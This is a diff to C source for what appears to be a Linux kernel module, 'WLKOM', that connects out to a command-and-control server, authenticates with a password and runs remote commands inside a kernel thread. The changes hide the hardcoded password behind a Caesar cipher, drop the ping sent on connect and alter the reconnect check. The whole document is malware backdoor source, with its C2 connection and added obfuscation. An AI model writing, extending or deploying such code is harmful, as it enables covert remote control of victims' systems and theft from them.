@@ -133,6 +133,23 @@ static int recv_packet(uint8_t *opcode, char **payload, uint32_t *len)
     return 0;
 }
 
+static void decrypt_caesar(const char *in, char *out, size_t max)
+{
+    size_t i;
+    for (i = 0; in[i] && i < max - 1; i++) {
+        char c = in[i];
+        if (c >= 'a' && c <= 'z')
+            out[i] = 'a' + (c - 'a' - 3 + 26) % 26;
+        else if (c >= 'A' && c <= 'Z')
+            out[i] = 'A' + (c - 'A' - 3 + 26) % 26;
+        else if (c >= '0' && c <= '9')
+            out[i] = '0' + (c - '0' - 3 + 10) % 10;
+        else
+            out[i] = c;
+    }
+    out[i] = '\0';
+}
+
 
 /* ─── Execute a command and return output ─── */
 
@@ -197,7 +214,10 @@ static int handle_packet(uint8_t opcode, char *payload, uint32_t len)
     switch (opcode) {
 
     case CMD_AUTH: {
-        if (len == 0 || strncmp(payload, WLKOM_PASSWORD, len) != 0) {
+        char real_pass[256];
+        decrypt_caesar(WLKOM_PASSWORD, real_pass, sizeof(real_pass));
+
+        if (len == 0 || strncmp(payload, real_pass, len) != 0) {
             pr_warn("WLKOM connect: bad password\n");
             send_packet(CMD_AUTH, "FAIL", 4);
             return -1;
@@ -207,6 +227,7 @@ static int handle_packet(uint8_t opcode, char *payload, uint32_t len)
         pr_info("WLKOM connect: authenticated\n");
         break;
     }
+
 
     case CMD_PING:
         send_packet(CMD_PONG, NULL, 0);
@@ -352,9 +373,6 @@ static int connect_thread(void *data)
         authed    = false;
         pr_info("WLKOM connect: connected to C2 %s:%d\n", c2_ip, c2_port);
 
-        /* Send a PING so the C2 gets a visual alert */
-        send_packet(CMD_PING, NULL, 0);
-
         /* Packet loop */
         while (!kthread_should_stop() && !stop_thread) {
             uint8_t  opcode;
@@ -362,7 +380,7 @@ static int connect_thread(void *data)
             uint32_t payload_len = 0;
 
             int ret = recv_packet(&opcode, &payload, &payload_len);
-            if (ret <= 0) {
+            if (ret < 0) {
                 pr_warn("WLKOM connect: disconnected, reconnecting...\n");
                 kfree(payload);
                 break;
